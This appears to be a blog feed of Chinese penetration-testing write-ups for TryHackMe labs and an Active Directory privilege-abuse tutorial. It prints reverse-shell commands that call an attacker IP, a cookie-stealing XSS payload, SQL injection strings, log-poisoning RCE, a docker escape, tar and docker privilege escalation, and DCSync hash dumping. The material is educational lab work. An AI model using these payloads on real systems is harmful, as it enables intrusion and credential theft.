        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.89.86</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.89.86</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018160045039-313432027.png" alt="image-20241018160031179"></p><p>发现开放22，80端口</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018152418808-1060650834.png" alt="image-20241018152404974"></p><p>发现点击dog或者cat，会显示一张相应的图片</p><p>先扫描一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.10.89.86/ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018160059374-298481108.png" alt="image-20241018160045419"></p><p>访问<code>/cats</code>显示403，除此之外并没有什么有用的信息</p><h1 id="LIF导致RCE"><a href="#LIF导致RCE" class="headerlink" title="LIF导致RCE"></a>LIF导致RCE</h1><p>再次查看我们的页面</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018161701177-2088714964.png" alt="image-20241018161647388"></p><p>在url处有个参数view，尝试一下目录穿越</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018161810480-951159654.png" alt="image-20241018161756644"></p><p>有效果，可以文件包含，并且默认在后面加<code>.php</code>文件后缀了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018161932049-1336654229.png" alt="image-20241018161918408"></p><p>测试后发现可以通过<code>%00</code>可以截断</p><p>使用伪协议尝试读取源码</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=php://filter/convert.base64-encode/resource=dog</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162225948-1416006650.png" alt="image-20241018162212286"></p><p>base64解码一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K&quot;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162330439-314328065.png" alt="image-20241018162316656"></p><p>尝试读取一下别的文件</p> <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=php://filter/convert.base64-encode/resource=dog/../index</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162600495-2121576637.png" alt="image-20241018162546442"></p><p>发现解码后的代码，我们还可以控制<code>ext</code>变量，来控制文件后缀，所以我们就可以读取任意文件了</p><p>先读取<code>/etc/passwd</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=view=dog/../../../../etc/passwd&amp;ext=</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162851221-1049120622.png" alt="image-20241018162837485"></p><p>看源码比较清晰一点</p><p>这里貌似没什么信息，查看一下日志</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=view=dog/../../../../../../../var/log/apache2/access.log&amp;ext=</span><br></pre></td></tr></table></figure><p>最终找到了<code>apache2</code>的日志</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018163529321-1675570605.png" alt="image-20241018163515318"></p><p>在最后发现我们的操作会被记录下来，并且请求头的信息也保存了</p><p>尝试更改请求头试一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018163851053-760002723.png" alt="image-20241018163836959"></p><p>我们自定义的请求头被写入到日志文件中了，尝试写入php代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://10.10.89.86/&quot;</span> -H <span class="string">&quot;User-Agent: &lt;?php system(&#x27;whoami&#x27;)?&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018164041488-425159992.png" alt="image-20241018164027252"></p><p>成功RCE！</p><h1 id="获得初始访问权限"><a href="#获得初始访问权限" class="headerlink" title="获得初始访问权限"></a>获得初始访问权限</h1><p>先将RCE完善一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://10.10.89.86/&quot;</span> -H <span class="string">&quot;User-Agent: &lt;?php system(\$_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018165138954-1219496020.png" alt="image-20241018165124697"></p><p>可以执行命令，我们就尝试反弹shell，先建立个监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018164149123-438306846.png" alt="image-20241018164135561"></p><p>执行一下反弹shell命令（注意要url编码）</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;<span class="variable">$sock</span>=fsockopen(<span class="string">&quot;10.14.90.122&quot;</span>, <span class="number">8888</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181125748-1188823251.png" alt="image-20241018181111610"></p><p>成功获取初始权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181201855-1454053211.png" alt="image-20241018181148117"></p><p>在当前页面找到<code>flag.php</code></p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><p>先找一下flag的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;*flag*&quot;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181620922-1758860058.png" alt="image-20241018181607197"></p><p>找到flag2</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181644383-1741156501.png" alt="image-20241018181630748"></p><p><code>sudo -l</code>查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018183042873-653679545.png" alt="image-20241018183028748"></p><p>发现<code>env</code>命令具有root权限，使用<code>env</code>命令提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018183104360-4899350.png" alt="image-20241018183050727"></p><p>获得root权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018183127751-2047869555.png" alt="image-20241018183114104"></p><p>在<code>/root</code>下找到<code>flag3.txt</code></p><h1 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h1><p>在根目录中找到<code>.dockerenv</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018185123618-1506946845.png" alt="image-20241018185109777"></p><p>可知我们在docker内</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018185222092-292349124.png" alt="image-20241018185208376"></p><p>仔细翻找文件后发现以上内容，仔细查看一下，发现像是备份文件的命令，过段时间后会发现<code>backup.tar</code>文件的修改时间改变了，推断出可能正在执行一个<code>cron</code>任务</p><p>我们可以尝试写入反弹shell的命令，并以主机上的 root 身份获取 shell</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.14.90.122/8889 0&gt;&amp;1&quot;</span> &gt;&gt; backup.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018190855406-938924442.png" alt="image-20241018190841293">主机进行监听，过段时间后我们获取到了主机的shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018191712386-1712812147.png" alt="image-20241018191658563"></p><p>成功获取主机shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018191743754-679623711.png" alt="image-20241018191730005"></p><p>在<code>/root</code>目录找到最后一个flag</p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> THM </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-The Marketplace</title>
      <link href="/posts/aad874a7.html"/>
      <url>/posts/aad874a7.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.113.205</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap -min-rate 10000 -A -sV -sC -p- 10.10.113.205</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017154217241-1022693500.png" alt="image-20241017154202881"></p><p>发现有22，80，32768端口开放</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017154322531-882372758.png" alt="image-20241017154309971"></p><p>先扫描目录</p><p><code>gobuster dir -u http://10.10.113.205/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017154759524-796732244.png" alt="image-20241017154746973"></p><p>先创建一个普通用户查看一下相关路径，得到以下结果：</p><ul><li><code>/admin</code> 需要登录认证才能查看</li><li><code>/signup</code> 注册</li><li><code>/login</code> 登录</li><li><code>/new</code> 创建一个新列表</li><li><code>/messages</code> 查看消息</li><li><code>/contact/michael</code> 联系列表作者</li><li><code>/item/1</code> 查看具体列表的详细信息</li><li><code>/report/1</code> 向管理员报告列表</li></ul><h1 id="XSS钓鱼越权"><a href="#XSS钓鱼越权" class="headerlink" title="XSS钓鱼越权"></a>XSS钓鱼越权</h1><p>测试后发现在创建新列表的时候，<code>Description</code>的值存在存储型xss</p><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160338454-1233589541.png" alt="image-20241017160325926"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160357257-693709284.png" alt="image-20241017160344536"></p><p>可以利用xss得到cookie等关键信息</p><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160619411-1869855713.png" alt="image-20241017160607215"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160525019-1199388518.png" alt="image-20241017160512805"></p><p>发现cookie的格式像是jwt，可以使用<a href="https://jwt.io/">在线工具</a>查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017161223991-2004112504.png" alt="image-20241017161211306"></p><p>想尝试将cookie伪造成admin，但是失败了</p><p>我们的商品存在存储型XSS漏洞，那么我们可以在我们的商品页面作为钓鱼页面，举报自己的商品诱导管理员审核，然后得到管理员的Cookie，提取他的Token</p><ul><li>首先，建立监听用于获取cookie</li></ul><p><code>python -m http.server</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162043360-56155628.png" alt="image-20241017162030691"></p><ul><li>然后构造XSS钓鱼页面，当有人访问的时候获取他的cookie</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="variable language_">this</span>.<span class="property">src</span>=<span class="string">&quot;http://10.14.90.122:8000/?1=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code> 用于加载图像。</p><p><code>src=x</code> 设置一个无效的图像源，通常会导致加载失败。</p><p><code>onerror</code> 当图像加载失败时触发的事件。</p><p><code>this.src</code> 在图像加载失败时，将图像的 <code>src</code> 属性设置为一个 URL，即为我们构造的一个新的URL将当前页面的 cookies 作为查询参数添加到该 URL 中</p><p><code>document.cookie</code> 获取当前页面的 cookies</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162252922-660876351.png" alt="image-20241017162240509"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162337370-966054914.png" alt="image-20241017162324966"></p><p>这时我们会收到大量的cookie，现在举报商品</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162452408-1679239075.png" alt="image-20241017162440113"></p><p>发现有几条不一样的，分析一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162542667-494681323.png" alt="image-20241017162530429"></p><p>发现是admin的cookie，更换cookie</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162715518-1364164542.png" alt="image-20241017162703243"></p><p>更换后刷新页面</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162747921-460184614.png" alt="image-20241017162735330"></p><p>发现多了个<code>Administrator panel</code>，现在已经成功越权到admin了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162826902-308858830.png" alt="image-20241017162814445"></p><p>点击后获得flag</p><h1 id="SQL注入拿shell"><a href="#SQL注入拿shell" class="headerlink" title="SQL注入拿shell"></a>SQL注入拿shell</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163022484-117763262.png" alt="image-20241017163010291"></p><p>随便点击一个用户发现是通过get传参，<code>user</code>是参数进行查询的，判断一下是否有sql注入</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163149364-625326231.png" alt="image-20241017163137167"></p><p>可以注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163317723-1348407264.png" alt="image-20241017163305552"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163417336-620897975.png" alt="image-20241017163404953"></p><p>判断出字段数是4</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163452909-662759722.png" alt="image-20241017163440726"></p><p>发现回显位置有1和2</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163650303-2129390896.png" alt="image-20241017163637823"></p><p>找到数据库名<code>marketplace</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;marketplace&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163725041-1630260119.png" alt="image-20241017163712870"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;marketplace&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;messages&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163755877-1253692693.png" alt="image-20241017163743652"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> concat_ws(<span class="string">&#x27;,&#x27;</span>,id,is_read,message_content,user_from,user_to),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> marketplace.messages limit <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163858140-647301558.png" alt="image-20241017163845970"></p><p>找到了<code>jake</code>用户的ssh密码<code>@b_ENXkGYUCAv3zJ</code></p><p>ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jake@10.10.113.205</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164154918-51511059.png" alt="image-20241017164142284"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164213325-995265159.png" alt="image-20241017164201069"></p><p>在当前目录找到<code>user.txt</code></p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>经典<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164349253-2140029166.png" alt="image-20241017164336681"></p><p>发现我们可以不使用密码以michael的身份运行<code>/opt/backups/backup.sh</code>，查看一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/backups/backup.sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164623416-1133329500.png" alt="image-20241017164611144"></p><p>这是一个压缩备份当前目录下的所有文件的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cf /opt/backups/backup.tar *</span><br></pre></td></tr></table></figure><p>可以用tar进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=/bin/sh</span><br></pre></td></tr></table></figure><p><code>/dev/null</code> 特殊的路径，写入该文件的数据都会被丢弃，但脚本中已经定义了路径所以我们不用管</p><p><code>--checkpoint=1</code> 在归档过程中每处理一个文件时，生成一个检查点。这个选项通常用于长时间运行的 tar 操作。</p><p><code>--checkpoint-action=exec=/bin/sh</code> 在每个检查点触发时执行指定的命令。这里指定的命令是 <code>/bin/sh</code>，即启动一个新的 shell。</p><p>只要能够让<code>--checkpoint=1</code>和<code>--checkpoint-action=exec=sh</code>运行起来就行了，那么我们只用创建两个名为<code>--checkpoint=1</code>和<code>--checkpoint-action=exec=sh</code>的文件就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; shell.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;--checkpoint-action=exec=sh shell.sh&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; --checkpoint=1</span><br><span class="line"><span class="built_in">chmod</span> 777 backup.tar</span><br><span class="line">sudo -u michael /opt/backups/backup.sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017183620069-1667799123.png" alt="image-20241017183604622"></p><p>需要注意的是要将<code>backup.tar</code>权限设置成能允许其他用户可以访问的权限</p><p>现在就移动到<code>michael</code>权限</p><h2 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h2><p><code>id</code>看下权限先</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017183927283-989168472.png" alt="image-20241017183913322"></p><p>发现有个docker权限</p><p>利用docker提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt --<span class="built_in">rm</span> -it alpine <span class="built_in">chroot</span> /mnt sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017184042987-2077176883.png" alt="image-20241017184029556"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017184117724-885437577.png" alt="image-20241017184104249"></p><p>在<code>/root</code>下找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> THM </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透中可滥用权限及其应用</title>
      <link href="/posts/32b1aa46.html"/>
      <url>/posts/32b1aa46.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="滥用writeDACL-权限实现权限提升"><a href="#滥用writeDACL-权限实现权限提升" class="headerlink" title="滥用writeDACL 权限实现权限提升"></a>滥用writeDACL 权限实现权限提升</h1><p>简介：在域环境中，如果安装Exchange后，系统会添加一个名为Microsoft Exchange Security Groups、Exchange Trusted Subsystem和Exchange Windows Permission三个组。如果获得了这三个组内任意用户的控制权限，就能够继承用户组的WriteDACL权限，WriteDACL权限可以修改域对象的ACL，最终实现利用DCSync导出域内所有用户hash，实现权限提升的目的。</p><p><strong>实际应用场景：</strong></p><p>通过在BloodHound中搜索“svc-alfresco”用户，我发现实际上该用户属于 Account Operators 组，该组是AD中的特权组之一，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器。但是，不能更改属于Administrators或Domain Admins组的账号，也不能更改这些组。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476652454-cbd90151-2f5d-44d4-b511-936ce92fa7fd.png" alt="img"></p><p>通过下图我们可以看到从 svc-alfresco 到 Domain Admins 的路径，我们在下图中的发现exchange windows permission组完全信任Account Operators 组，因此我们可以利用Account Operators 组的权限创建一个新用户，然后把他添加到exchange windows permission组，这样我们就可以对HTB.LOCAL进行一些操作了，我们看到exchange windows permission组的成员对htb.local用有writeDACL权限， 然后我们可以利用我们新添加的用户对HTB.LOCAL的 writeDACL权限进行恶意利用，进而实现权限提升，</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476675522-224d3254-95d2-49a7-a15e-6b34a99efc6d.png" alt="img"></p><p>默认情况下，Exchange Windows Permissions安全组对安装 Exchange 的域的域对象具有 writeDACL 权限。</p><p>writeDACL 权限允许身份修改指定对象的权限（换句话说：修改 ACL），这意味着通过成为组织管理组的成员，我们能够将权限提升到域管理员的权限。<br>为了利用这一点，我们将新创建的用户帐户添加到该Exchange Windows Permission组中。Exchange Windows Permission组的成员，这允许我们修改HTB.LOCAL域的 ACL。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user popayw 123abc! /add /domain# 创建用户</span><br><span class="line">net group    #该命令的结果中找到了Exchange Windows Permissions组</span><br><span class="line">net group &quot;Exchange Windows Permissions&quot; popayw /add# 将用户添加到Exchange Windows Permissions组</span><br><span class="line">net localgroup #在该命令的结果中发现了Remote Management Users组</span><br><span class="line">net localgroup &#x27;Remote Management Users&#x27; popayw  /add</span><br></pre></td></tr></table></figure><p>如果我们有权修改 AD 对象的 ACL，则可以将权限分配给允许他们写入特定属性（例如包含电话号码的属性）的身份。除了为这些属性分配读/写权限外，还可以为扩展权限分配权限。这些权限是预定义的任务，例如更改密码、向邮箱发送电子邮件等权限2。通过应用以下扩展权限，还可以将任何给定帐户添加为域的复制伙伴：</p><ul><li>复制目录更改（DS-Replication-Get-Changes）</li><li>全部复制目录更改 (DS-Replication-Get-Changes-All )</li></ul><p>当我们为我们的用户帐户设置这些权限时，我们能够请求域中任何用户的密码哈希，那么具体如何获取的呢？</p><h1 id="DCsync攻击"><a href="#DCsync攻击" class="headerlink" title="DCsync攻击"></a><strong>DCsync攻击</strong></h1><ul><li>DCSync攻击原理</li></ul><p><strong>主要利用的是域控制器之间的数据同步复制</strong></p><p>当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。</p><p>用户想要发起<code>DCSync</code>攻击，必须获得以下任一用户的权限</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>之前我们已经创建了一个有<code>DCSync</code>权限的用户，我们可以使用<code>secretsdump.py</code>工具执行 <code>DCSync</code> 以转储管理员用户的 <code>NTLM</code> 哈希</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="regexp">/usr/</span>share<span class="regexp">/doc/</span>python3-impacket<span class="regexp">/examples/</span>secretsdump.py popayw:<span class="string">&#x27;123abc!&#x27;</span>@<span class="number">10.10</span>.<span class="number">10.161</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474277130-8a9b1f9b-9cf6-4513-8c72-d88025f31177.png" alt="img"></p><p>可以看到已经拿到所有用户的<code>hash</code>，包括<code>admin</code>用户的</p><h1 id="滥用SeBackupPrivilege权限进行NTDS-dt卷影拷贝实现权限提升"><a href="#滥用SeBackupPrivilege权限进行NTDS-dt卷影拷贝实现权限提升" class="headerlink" title="滥用SeBackupPrivilege权限进行NTDS.dt卷影拷贝实现权限提升"></a>滥用SeBackupPrivilege权限进行NTDS.dt卷影拷贝实现权限提升</h1><p>简介：SeBackupPrivilege权限用来实现备份操作，允许文件内容检索，即使文件上的安全描述符可能未授予此类访问权限。 启用了 